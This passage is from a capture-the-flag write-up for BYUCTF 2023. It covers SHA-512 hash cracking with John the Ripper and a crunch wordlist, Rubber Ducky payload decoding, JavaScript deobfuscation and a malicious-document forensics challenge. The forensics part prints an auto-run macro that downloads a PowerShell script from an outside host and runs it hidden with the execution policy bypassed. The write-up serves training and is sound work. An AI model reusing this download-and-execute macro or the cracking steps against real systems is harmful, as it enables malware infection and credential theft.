Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
--------------------------------------------------
 HASH: 3FAE7E18F9004673D0E68CA10264A1ABAF76FBF42E60D960A1B95289401146E4BF39E599641C730DB8F664F7F1DD02F171BEB4730AC756AAC7CF40C6BC4D623A

Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
--------------------------------------------------
 HASH: 5C6E3A016FC76F6EC3E062F266977A2C32FD875F0911323256B50A7AA6E24A8C0AD4E6225CA07A73BA1487A83AD7F058CE77345969F1FC04FD6168C15A39EB00

Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
--------------------------------------------------
 HASH: A7383D14CF904E91C0F0226CC926CC6CA7CF91F1907025AE961627B444C412247823DA87C3AF69D8A490538554F6E59E972D4EE861726A7B2B3D808CD5096A5B

Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
--------------------------------------------------

```

Great, let's crack them with ```john the ripper``` using the ```rockyou.txt``` wordlist.

```bash
$ john --format=raw-sha512 --wordlist=/usr/share/wordlists/rockyou.txt 006_3.txt
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-SHA512 [SHA512 256/256 AVX2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=8
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
goldeneye007     (?)     
goldeneye641     (?)     
2g 0:00:00:01 DONE (2023-05-22 23:58) 1.307g/s 9374Kp/s 9374Kc/s 24072KC/s "camilap91..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

As we can see, we found two of the fourth passwords. And both are ```goldeneye***```, where the stars are differents numbers.

So let's generate a custom wordlist with ```goldeneye***``` and all possibles digits for the stars, using ```crunch```.

```bash
$ crunch 12 12 0123456789 -t goldeneye@@@ > 006-wordlist.txt
Crunch will now generate the following amount of data: 13000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1000
```

Crunch as generated a wordlists of minimum `12` and maximum `12` characters words, each words start by `goldeneye` and end with three digits for all possible combination using the digits `0123456789`. The resulting wordlists is saved in ```006-wordlist.txt```.

Now let's run john against our hashes using our custom wordlist.

```bash
$ john --format=raw-sha512 --wordlist=006-wordlist.txt 006_3.txt
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-SHA512 [SHA512 256/256 AVX2 4x])
Remaining 2 password hashes with no different salts
Warning: poor OpenMP scalability for this hash type, consider --fork=8
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
goldeneye159     (?)     
goldeneye069     (?)     
2g 0:00:00:00 DONE (2023-05-23 00:07) 100.0g/s 50000p/s 50000c/s 100000C/s goldeneye000..goldeneye999
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

$ john --format=raw-sha512 --show 006_3.txt
?:goldeneye007
?:goldeneye641
?:goldeneye069
?:goldeneye159

4 password hashes cracked, 0 left
```

Great! We get all the passwords! But now, we need to be sure which password is which hash, to know the flag format.

For this simply edit the file, and add an username before every hashes.

```bash
v0lk3n-1:6328C530F895CA13C75E161DEC260EC2C0BED4FCFF1B34448EA16A7FFFFA5CDC403E5CC83B23321E9AD3280952BE2ADB037DD7AFA3084B7E940C6A655B2F13BA
v0lk3n-2:3FAE7E18F9004673D0E68CA10264A1ABAF76FBF42E60D960A1B95289401146E4BF39E599641C730DB8F664F7F1DD02F171BEB4730AC756AAC7CF40C6BC4D623A
v0lk3n-3:5C6E3A016FC76F6EC3E062F266977A2C32FD875F0911323256B50A7AA6E24A8C0AD4E6225CA07A73BA1487A83AD7F058CE77345969F1FC04FD6168C15A39EB00
v0lk3n-4:A7383D14CF904E91C0F0226CC926CC6CA7CF91F1907025AE961627B444C412247823DA87C3AF69D8A490538554F6E59E972D4EE861726A7B2B3D808CD5096A5B
```

Save the file and run john again to show the cracked hashes.

```bash
$ john --format=raw-sha512 --show 006_3.txt
v0lk3n-1:goldeneye007
v0lk3n-2:goldeneye641
v0lk3n-3:goldeneye069
v0lk3n-4:goldeneye159

4 password hashes cracked, 0 left
```

Great, we got the flag! 

FLAG : **byuctf{goldeneye007_goldeneye641_goldeneye069_goldeneye159}**


## Rev<a name="Rev"></a>

## Ducky 1<a name="Ducky1"></a>

Value : **100pts**

Difficulty : **Easy**

Description :

```
I recently got ahold of a Rubber Ducky, and have started automating ALL of my work tasks with it! You should check it out!
```

### Solution

We got as attachment a Ducky ```.bin``` file. 

> Thoses files are used to inject keystroke on a target computer by using a device that will emulate a HID keyboard. Such as a Rubber Ducky, P4wnP1, Flipper Zero and more.

Our goal here, is to know what the payload will do. So go to the site ```Duck Toolkit```. And decode the payload.

Source : https://ducktoolkit.com/

Upload your ```inject.bin``` file to the decode utility of the site. Then chose your keyboard layout at top right (we choose the default one, on this challenge). And decode it.

![1-DecodePayload](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/172e332e-d69b-44a9-8e83-d938fb224e32)

As you can see at the bottom right, you can choose between download the result, or edit it on the online editor. I personally choose this option.

![2-EditFlag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/34e007be-5d0b-4de6-a75f-3c840ef3c424)

We get the flag!

Flag : **byuctf{this_was_just_an_intro_alright??}**

## ObfuscJStore<a name="Obfuscator"></a>

Value : **100pts**

Difficulty : **Easy**

Description :

```
Obfuscated JavaScript?? Really??
```

### Solution

As said the title and description. We get as attachment an obfuscated JavaScript code.

```js
function _0x12de(){var _0x6ab222=['\x2e\x69\x6f','\x75\x73\x63\x61\x74','\x37\x32\x4f\x4f\x6e\x7a\x73\x4d','\x61\x5f\x74\x6f\x6f','\x6c\x6f\x67','\x62\x79\x75\x63\x74','\x32\x30\x35\x38\x31\x31\x31\x56\x73\x4a\x6d\x4e\x74','\x64\x61\x79\x73\x5f','\x35\x62\x6b\x68\x53\x6b\x77','\x36\x32\x37\x38\x77\x53\x77\x45\x56\x49','\x31\x32\x35\x33\x31\x33\x30\x78\x4e\x74\x74\x57\x77','\x48\x6d\x6d\x6d\x6d','\x6c\x5f\x74\x6f\x5f','\x77\x68\x65\x72\x65','\x66\x6c\x61\x67\x20','\x34\x31\x30\x35\x39\x34\x34\x58\x71\x67\x53\x54\x64','\x31\x30\x69\x47\x78\x53\x78\x74','\x35\x33\x4d\x50\x56\x43\x43\x73','\x63\x61\x74\x6f\x72','\x6d\x61\x6b\x65\x5f','\x6f\x62\x66\x75\x73','\x32\x35\x34\x30\x30\x39\x74\x71\x59\x51\x79\x6b','\x35\x31\x30\x35\x30\x31\x46\x57\x64\x52\x56\x71','\x66\x7b\x6f\x6e\x65','\x64\x65\x6f\x62\x66','\x68\x65\x73\x65\x5f','\x5f\x6f\x66\x5f\x74','\x31\x37\x32\x36\x34\x35\x6f\x6b\x76\x58\x66\x70','\x69\x73\x3f','\x34\x6d\x6f\x71\x49\x6c\x56'];_0x12de=function(){return _0x6ab222;};return _0x12de();}(function(_0x2a4cef,_0x9e205){var _0x539a11=_0x2a7d,_0x40cc8a=_0x2a4cef();while(!![]){try{var _0x2d47a2=-parseInt(_0x539a11(0x1f1))/0x1*(-parseInt(_0x539a11(0x207))/0x2)+parseInt(_0x539a11(0x1f6))/0x3*(parseInt(_0x539a11(0x1fd))/0x4)+-parseInt(_0x539a11(0x206))/0x5*(-parseInt(_0x539a11(0x208))/0x6)+-parseInt(_0x539a11(0x1f5))/0x7*(parseInt(_0x539a11(0x200))/0x8)+parseInt(_0x539a11(0x204))/0x9*(-parseInt(_0x539a11(0x1f0))/0xa)+parseInt(_0x539a11(0x1fb))/0xb+parseInt(_0x539a11(0x1ef))/0xc;if(_0x2d47a2===_0x9e205)break;else _0x40cc8a['push'](_0x40cc8a['shift']());}catch(_0x4063a2){_0x40cc8a['push'](_0x40cc8a['shift']());}}}(_0x12de,0x54f50));function _0x2a7d(_0x339bb1,_0x1a0657){var _0x12def3=_0x12de();return _0x2a7d=function(_0x2a7d9a,_0x2b9202){_0x2a7d9a=_0x2a7d9a-0x1ee;var _0x34fb38=_0x12def3[_0x2a7d9a];return _0x34fb38;},_0x2a7d(_0x339bb1,_0x1a0657);}function hi(){var _0x398601=_0x2a7d;document['\x64\x6f\x6d\x61\x69'+'\x6e']==_0x398601(0x1f4)+_0x398601(0x1f2)+_0x398601(0x1fe)&&console[_0x398601(0x202)](_0x398601(0x203)+_0x398601(0x1f7)+_0x398601(0x1fa)+_0x398601(0x1f9)+_0x398601(0x205)+'\x69\x6d\x6d\x61\x5f'+_0x398601(0x1f3)+_0x398601(0x201)+_0x398601(0x20a)+_0x398601(0x1f8)+_0x398601(0x1ff)+'\x65\x5f\x74\x68\x69'+'\x73\x7d'),console['\x6c\x6f\x67'](_0x398601(0x209)+'\x20\x49\x20\x77\x6f'+'\x6e\x64\x65\x72\x20'+_0x398601(0x20b)+'\x20\x74\x68\x65\x20'+_0x398601(0x1ee)+_0x398601(0x1fc));}hi();
```

Go to an online deobufscator, and deobfuscate our JavaScript code.

Source : https://deobfuscate.io/

![1-Deobfuscate](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/6dc87443-2ac6-49bf-abcc-0d3cf5bd635d)


```js
function carita() {
  var nikkita = [".io", "uscat", "72OOnzsM", "a_too", "log", "byuct", "2058111VsJmNt", "days_", "5bkhSkw", "6278wSwEVI", "1253130xNttWw", "Hmmmm", "l_to_", "where", "flag ", "4105944XqgSTd", "10iGxSxt", "53MPVCCs", "cator", "make_", "obfus", "254009tqYQyk", "510501FWdRVq", "f{one", "deobf", "hese_", "_of_t", "172645okvXfp", "is?", "4moqIlV"];
  carita = function () {
    return nikkita;
  };
  return carita();
}
(function (jennesa, trentan) {
  var dannelle = alayzha, lismary = jennesa();
  while (true) {
    try {
      var ibrohim = -parseInt(dannelle(497)) / 1 * (-parseInt(dannelle(519)) / 2) + parseInt(dannelle(502)) / 3 * (parseInt(dannelle(509)) / 4) + -parseInt(dannelle(518)) / 5 * (-parseInt(dannelle(520)) / 6) + -parseInt(dannelle(501)) / 7 * (parseInt(dannelle(512)) / 8) + parseInt(dannelle(516)) / 9 * (-parseInt(dannelle(496)) / 10) + parseInt(dannelle(507)) / 11 + parseInt(dannelle(495)) / 12;
      if (ibrohim === trentan) break; else lismary.push(lismary.shift());
    } catch (burbon) {
      lismary.push(lismary.shift());
    }
  }
}(carita, 347984));
function alayzha(haowen, alassane) {
  var chandara = carita();
  return alayzha = function (anvi, ruwaida) {
    anvi = anvi - 494;
    var zakaya = chandara[anvi];
    return zakaya;
  }, alayzha(haowen, alassane);
}
function hi() {
  var gennetta = alayzha;
  document.domain == gennetta(500) + gennetta(498) + gennetta(510) && console[gennetta(514)](gennetta(515) + gennetta(503) + gennetta(506) + gennetta(505) + gennetta(517) + "imma_" + gennetta(499) + gennetta(513) + gennetta(522) + gennetta(504) + gennetta(511) + "e_thi" + "s}"), console.log(gennetta(521) + " I wo" + "nder " + gennetta(523) + " the " + gennetta(494) + gennetta(508));
}
hi();
```

Nice now we go to an Online JavaScript console (or real one, as you pref), we copy paste the code and run it.

Source : https://jsconsole.com/

![2-WhereIsTheFlag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/d04e20a8-aff3-490f-9973-aa0b61d1f060)

We get an console output saying ```Hmmmm I wonder where the flag is?```

Looking at the code, we notice the ```console.log``` which return this result.


![3-ConsoleStrange](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/70ecf025-981b-443d-95e5-1436ec7765bf)

We can notice that it forgot a lot of code previously, and we notice something which seem like some flag parts.

![4-IsThatAFlagPart](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/5a9145d3-d408-4c05-ad58-9f5917df8b5a)

Remove the begining of the ```console.log``` and replace it at the beginning of the whole ```document.domain``` value.

```js
// Remove this
console.log(
```

```js
// Final payload
document.domain == console.log(gennetta(500) + gennetta(498) + gennetta(510) && console[gennetta(514)](gennetta(515) + gennetta(503) + gennetta(506) + gennetta(505) + gennetta(517) + "imma_" + gennetta(499) + gennetta(513) + gennetta(522) + gennetta(504) + gennetta(511) + "e_thi" + "s}"), gennetta(521) + " I wo" + "nder " + gennetta(523) + " the " + gennetta(494) + gennetta(508));
```

![5-BiggerConsole](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/0c38fc5c-d1fa-4ce0-8b08-b5c6fe5515b4)

And once done send the request.

![6-Flag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/340da839-7a49-47ac-8c0b-381827e084b2)

We got the flag!

FLAG : **byuctf{one_of_these_days_imma_make_a_tool_to_deobfuscate_this}**

## Forensics<a name="Forensics"></a>

## Bing Chilling<a name="bing"></a>

Value : **100pts**

Difficulty : **Easy**

Description :

```
早上好中国现在我有冰淇淋我很喜欢冰淇淋但是速度与激情9比冰淇淋速度与激情速度与激情9我最喜欢所以…现在是音乐时间准备 1 2 3两个礼拜以后速度与激情9 ×3不要忘记不要错过记得去电影院看速度与激情9因为非常好电影动作非常好差不多一样冰淇淋再见
```

### Solution

We get as attachment a file named ```bingchilling.zip``` with as challenge description something in chinese. Translated in english, it said :

```
good morning china now i have ice cream i love ice cream but fast and furious 9 is better than ice cream fast and furious fast and furious 9 is my favorite so... now it's music time to prepare 1 2 3 two weeks later fast and furious 9 x 3 don't forget Don't miss it Remember to go to the cinema to watch Fast and Furious 9 because it's very good movie Action is very good Almost the same Ice cream Goodbye
```

Well... Ok O_o... Let's look at our file now.

Once our zip file extracted we get a odt chinese document. First let's rename it to something easier to write.

```
$ mv 早上好中国\ 现在我有冰淇淋\ 我很喜欢冰淇淋\ 但是\ 速度与激情9\ 比冰淇淋\ 速度与激情\ 速度与激情9\ 我最喜欢\ 所以…现在是音乐时间\ 准备\ 1\ 2\ 3\ 两个礼拜以后\ 速度与激情.odt bing-chall.odt
```

Now let's extract our document to see which content is there (pictures, text, macros and more).

```bash
$ unzip bing-chall.odt 
Archive:  bing-chall.odt
 extracting: mimetype                
  inflating: Basic/Standard/script-lb.xml  
  inflating: Basic/Project/NewMacros.xml  
  inflating: Basic/Project/ThisDocument.xml  
  inflating: Basic/Project/script-lb.xml  
  inflating: Basic/script-lc.xml     
   creating: Configurations2/popupmenu/
   creating: Configurations2/menubar/
   creating: Configurations2/floater/
   creating: Configurations2/toolbar/
   creating: Configurations2/statusbar/                                                                                                                                                                                                    
   creating: Configurations2/progressbar/                                                                                                                                                                                                  
   creating: Configurations2/toolpanel/                                                                                                                                                                                                    
   creating: Configurations2/images/Bitmaps/                                                                                                                                                                                               
   creating: Configurations2/accelerator/                                                                                                                                                                                                  
  inflating: manifest.rdf                                                                                                                                                                                                                  
  inflating: meta.xml                                                                                                                                                                                                                      
  inflating: settings.xml                                                                                                                                                                                                                  
 extracting: Thumbnails/thumbnail.png                                                                                                                                                                                                      
  inflating: styles.xml                                                                                                                                                                                                                    
  inflating: content.xml                                                                                                                                                                                                                   
 extracting: Pictures/100000000000074E0000041CC3029B2CAA0F3A47.png                                                                                                                                                                         
 extracting: Pictures/1000000000000500000002D0AD962E6A5DC3B411.png                                                                                                                                                                         
 extracting: Pictures/10000000000000FB000000C997053AEE03F0A275.png                                                                                                                                                                         
 extracting: Pictures/1000000000000500000002D06C1BF60FB5D30A71.png                                                                                                                                                                         
 extracting: Pictures/1000000000000150000000BCF3AA2023C0AF6260.png                                                                                                                                                                         
 extracting: Pictures/1000000000000400000004008A897BE8E3E1FD63.png                                                                                                                                                                         
 extracting: Pictures/100000000000012C000000A8D4F2BB255BA53689.png                                                                                                                                                                         
 extracting: Pictures/10000000000001E0000001E00790EBAF8EF5A7B0.png                                                                                                                                                                         
 extracting: Pictures/10000000000002E0000002E0CF4EC13014551F3C.png                                                                                                                                                                         
  inflating: META-INF/manifest.xml
```

Great, first thing that we will look is the file named ```NewMacros.xml```. Because maybe there is a malicious macro there?

```xml
$ cat Basic/Project/NewMacros.xml                                                                                                                                                                                                        
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="NewMacros" script:language="StarBasic" script:moduleType="normal">Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1
Sub AutoOpen()
    Dim FGHNBVRGHJJGFDSDUUUU As String
    FGHNBVRGHJJGFDSDUUUU = &quot;cmd /K &quot; + &quot;byu&quot; + &quot;ctf&quot; + &quot;{&quot; + &quot;m@ldocs @re&quot; + &quot;sn@eky and bad}&quot; + &quot;e -WindowStyle hiddeN -ExecuTionPolicy BypasS -noprofile (New-Object      System.Net.WebClient).DownloadFile(&apos;http://bsrc.baidu.com/drill/doc-zh.html&apos;,&apos;%TEMP%\Y.ps1&apos;);      poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile      -file %TEMP%\Y.ps1&quot;
    Shell FGHNBVRGHJJGFDSDUUUU, 0
    MsgBox (&quot;Module could not be found.&quot;)
End Sub

</script:module>
```

Great if you look carefully we can find the flag.

![1-Flag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/b3451f91-c0e3-4de7-9b35-b88827f6b195)

Now you only need to know to format it.

FLAG : **byuctf{m@ldocs @re sn@eky and bad}**

## Credits<a name="Credits"></a>

Special thanks to :

* **[ByuCTF2023](https://github.com/BYU-CSA/BYUCTF-2023)** - team for the CTF!
 
And of course... 

**Thanks to my team [Godzillhack!](https://godzillhack.com)**
